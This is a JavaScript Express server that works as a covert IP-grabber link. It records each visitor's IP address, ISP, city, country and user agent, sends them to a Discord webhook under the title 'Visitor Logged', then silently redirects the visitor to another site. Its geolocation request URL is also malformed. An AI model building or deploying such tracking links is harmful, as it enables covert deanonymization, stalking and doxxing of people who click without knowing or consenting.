const express = require('express');
const app = express();

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol';

app.get('/', async (req, res) => {
    // 1. Grab raw proxy header safely
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    
    // 2. Isolate the first true client IP before any proxy commas
    let clientIp = rawIp.replace(/,.*$/, '').trim();

    // 3. Clear local server loops
    if (clientIp.includes('::ffff:')) {
        clientIp = clientIp.replace('::ffff:', '');
    }
    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') {
        clientIp = '8.8.8.8'; // Fallback testing IP
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (DISCORD_WEBHOOK_URL) {
        try {
            // 4. FIXED: Using ipwhois.app handles high-speed proxy connections cleanly over HTTPS
            const geoResponse = await fetch(`https://ipwhois.app{clientIp}`);
            const geoData = await geoResponse.json();

            const discordPayload = {
                embeds: [{
                    title: "Visitor Logged",
                    color: 15548997, 
                    description: "A user has accessed the tracking link.",
                    fields: [
                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
                        // ipwhois.app outputs the carrier under 'isp' and the region names clearly
                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                    ],
                    footer: {
                        text: "System Monitor"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // 5. Fire the payload to Discord
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

        } catch (error) {
            console.error("Geo Data Retrieval Error:", error.message);
        }
    }

    // 6. Direct the user to the destination path safely
    res.redirect(302, REDIRECT_URL);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
